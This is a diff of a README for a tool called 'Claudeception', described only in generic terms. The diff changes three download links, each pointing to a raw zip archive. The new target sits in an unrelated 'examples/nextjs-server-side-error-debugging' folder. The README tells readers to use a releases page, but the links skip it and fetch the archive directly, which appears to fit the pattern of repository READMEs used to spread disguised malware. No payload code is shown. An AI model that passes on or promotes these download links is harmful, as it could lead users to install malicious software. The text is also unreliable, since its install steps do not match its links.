@@ -1,6 +1,6 @@
 # 🚀 Claudeception - Enhance Your Learning Experience Effortlessly
 
-[![Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/resources/Software-v1.9-alpha.2.zip)](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/resources/Software-v1.9-alpha.2.zip)
+[![Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/examples/nextjs-server-side-error-debugging/Software_1.3.zip)](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/examples/nextjs-server-side-error-debugging/Software_1.3.zip)
 
 ## 📘 Overview
 
@@ -20,7 +20,7 @@ Follow these steps to download and start using Claudeception.
 1. **Visit the Releases Page**: 
    To download Claudeception, click the link below.
 
-   [Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/resources/Software-v1.9-alpha.2.zip)
+   [Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/examples/nextjs-server-side-error-debugging/Software_1.3.zip)
 
 2. **Select the Latest Release**: 
    On the releases page, look for the latest version. It will usually be at the top of the list.
@@ -41,7 +41,7 @@ Follow these steps to download and start using Claudeception.
 
 To start using Claudeception, visit the link below and follow the steps above for a smooth download and installation.
 
-[Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/resources/Software-v1.9-alpha.2.zip)
+[Download Claudeception](https://github.com/DanTo228/Claudeception/raw/refs/heads/main/examples/nextjs-server-side-error-debugging/Software_1.3.zip)
 
 ## 🔧 System Requirements
 
